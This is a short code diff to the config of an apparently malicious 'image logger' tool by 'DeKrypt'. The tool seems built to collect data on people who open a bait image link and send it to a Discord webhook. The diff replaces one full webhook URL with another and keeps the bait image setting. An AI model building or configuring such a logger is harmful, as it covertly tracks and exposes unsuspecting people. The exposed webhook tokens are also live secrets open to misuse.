@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1373052978310807602/VPdbdBEdrRzVtQ9GqPwP6WtovlJ8koKH29wWreulZ5_Q3nd1qMHBOyHKxjSpf6UGocl3",
+    "webhook": "https://discord.com/api/webhooks/1374370196474826812/h7nlOVksVB1fx1m-acAZvmT6frmoneFSZ4FiawhhAnjKWI2eb6YHNAauewfkPvy0WOwf",
     "image": "https://thehowler.org/wp-content/uploads/2018/01/roll-safe-meme-1.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
